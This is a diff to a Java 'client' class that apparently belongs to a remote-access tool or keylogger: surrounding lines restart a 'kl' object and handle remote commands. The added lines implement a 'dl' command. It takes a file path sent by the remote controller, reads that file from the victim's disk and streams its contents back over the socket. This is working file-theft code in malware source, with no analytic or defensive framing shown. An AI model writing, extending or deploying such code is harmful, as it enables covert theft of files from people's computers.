@@ -86,6 +86,18 @@ public class client {
                         kl.restart();
                         ps.println("c");
                     }
+                    if (line.equals("dl")) {
+                        ps.println("ok");
+                        String floc = din.readLine();
+                        File fsend = new File(floc);
+                        ps.println(fsend.getName());
+                        byte[] barr = new byte[(int)fsend.length()];
+                        BufferedInputStream bistr = new BufferedInputStream(new FileInputStream(fsend));
+                        bistr.read(barr,0,barr.length);
+                        OutputStream ostr = sock.getOutputStream();
+                        ostr.write(barr,0,barr.length);
+                        ostr.flush();
+                    }
                     if (line.equals("ap99")) {
                         int seconds = Integer.parseInt(din.readLine());
                         ps.flush();
